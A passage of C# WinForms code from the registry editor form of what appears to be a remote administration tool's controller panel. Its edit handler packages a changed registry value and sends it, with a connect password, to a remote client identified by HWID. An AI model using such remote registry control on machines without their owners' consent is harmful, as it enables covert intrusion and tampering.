                return tvRegistryDirectory.SelectedNode.Parent != null;
            }

            return false;
        }

        private bool GetRenameState()
        {
            if (lstRegistryValues.Focused)
            {
                return lstRegistryValues.SelectedItems.Count == 1 && !RegValueHelper.IsDefaultValue(lstRegistryValues.SelectedItems[0].Name);
            }

            if (tvRegistryDirectory.Focused && tvRegistryDirectory.SelectedNode != null)
            {
                return tvRegistryDirectory.SelectedNode.Parent != null;
            }

            return false;
        }

        private Form GetEditForm(RegValueData value, RegistryValueKind valueKind)
        {
            switch (valueKind)
            {
                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    return new helperFormRegValueEditString(value);
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    return new helperFormRegValueEditWord(value);
                case RegistryValueKind.MultiString:
                    return new helperFormRegValueEditMultiString(value);
                case RegistryValueKind.Binary:
                    return new helperFormRegValueEditBinary(value);
                default:
                    return null;
            }
        }

        private void CreateEditForm(bool isBinary)
        {
            string keyPath = tvRegistryDirectory.SelectedNode.FullPath;
            string name = lstRegistryValues.SelectedItems[0].Name;
            RegValueData value = ((RegValueData[])tvRegistryDirectory.SelectedNode.Tag).ToList().Find(item => item.Name == name);

            // any kind can be edited as binary
            RegistryValueKind kind = isBinary ? RegistryValueKind.Binary : value.Kind;

            using (var frm = GetEditForm(value, kind))
            {
                if (frm.ShowDialog() == DialogResult.OK)
                {
                    byte[] Value = Helper.Helper.Serialize((RegValueData)frm.Tag);

                    //ChangeRegistryValue(keyPath, (RegValueData) frm.Tag);
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "ChangeRegistryValue";
                    pack.ForcePathObject("TargetClient").AsString = HWID;
                    pack.ForcePathObject("KeyPath").AsString = tvRegistryDirectory.SelectedNode.FullPath;
                    pack.ForcePathObject("Value").SetAsBytes(Value);

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
            }
        }

        #endregion

        private void lstRegistryValues_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            int tColumnCount;
            var tRect = new Rectangle();
            var tPoint = new Point();
            var tFont = new Font("Segoe UI", 9, FontStyle.Regular);
            var tBackBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colorlistviewdark
                : Settings.Default.colorlistview);
            SolidBrush tFtontBrush;
            tFtontBrush = new SolidBrush(Settings.Default.darkTheme
                ? Settings.Default.colortextdark
                : Settings.Default.colortext);
            if (lstRegistryValues.Columns.Count == 0) return;

            tColumnCount = lstRegistryValues.Columns.Count;
            tRect.Y = 0;
            tRect.Height = e.Bounds.Height - 1;
            tPoint.Y = 3;
            for (var i = 0; i < tColumnCount; i++)
            {
                if (i == 0)
                {
                    tRect.X = 0;
                    tRect.Width = lstRegistryValues.Columns[i].Width;
                }
                else
                {
                    tRect.X += tRect.Width;
                    tRect.X += 1;
                    tRect.Width = lstRegistryValues.Columns[i].Width - 1;
                }

                e.Graphics.FillRectangle(tBackBrush, tRect);
                tPoint.X = tRect.X + 3;
                e.Graphics.DrawString(lstRegistryValues.Columns[i].Text, tFont, tFtontBrush, tPoint);
            }
        }

        private void lstRegistryValues_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }
    }
}
